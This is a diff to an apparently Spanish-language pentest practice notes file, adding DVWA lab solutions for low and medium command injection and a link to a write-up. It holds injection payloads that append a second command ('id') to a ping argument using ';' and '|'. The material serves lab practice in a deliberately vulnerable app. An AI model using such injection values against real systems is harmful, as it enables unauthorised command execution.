@@ -931,6 +931,25 @@ sudo umount /mnt/Windows
 ```
 
 
+## DVWA
+
+### LOW Command Injection
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/2ef719b2-0315-4c8c-afce-5b6e5b151659)
+
+```
+ping -c 1 127.0.0.1;id
+```
+
+### Medium Command Injection
+
+![image](https://github.com/gecr07/Pentest-Exercices/assets/63270579/240f212a-440c-4686-8bd4-621cb556f089)
+
+```
+ping -c 1 127.0.0.1| id
+```
+
+
 ## Bibliografias 
 
 /dev/tcp
@@ -976,7 +995,9 @@ Metasploit sheetcheat
 
 > https://www.comparitech.com/net-admin/metasploit-cheat-sheet/
 
+DVWA
 
+> https://n3dx0o.medium.com/dvwa-command-execution-solutions-low-medium-high-6ee354dc2974
 
 
 
